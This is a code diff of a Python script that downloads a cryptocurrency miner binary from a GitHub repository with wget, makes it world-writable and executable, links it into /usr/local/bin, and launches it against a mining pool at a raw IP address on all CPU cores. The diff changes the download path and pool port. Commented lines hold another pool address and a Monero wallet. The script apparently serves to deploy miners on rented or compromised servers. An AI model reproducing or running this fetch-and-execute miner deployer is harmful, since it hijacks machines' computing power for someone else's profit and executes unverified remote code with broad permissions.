@@ -17,7 +17,7 @@ if cores <= 0:
 os.system('sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 3))')
 try:
     if os.path.isfile('/usr/local/bin/' + program) == False:
-        os.system('wget https://github.com/nhatquanglan/daovps/raw/master/xmrig_tls/' + program)
+        os.system('wget https://github.com/nhatquanglan/daovps/raw/master/' + program)
         os.system('chmod 777 ' + program)
         workingdir = os.getcwd()
         os.system('ln -s -f ' + workingdir + '/' + program + ' ' +'/usr/local/bin/' + program)
@@ -27,4 +27,4 @@ except:
     pass
 #os.system ('xmrig --av=7 --variant 1 --donate-level=0 -o stratum+tcp://pool.minexmr.com:4444 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf+20001')
 #os.system ('xmrig --av=5 -o stratum+tcp://144.202.23.108:4444')
-os.system (program + ' --donate-level 1 -o stratum+tcp://66.42.53.57:444 --tls -t ' + str(cores))
+os.system (program + ' --donate-level 1 -o stratum+tcp://66.42.53.57:442 -t ' + str(cores))
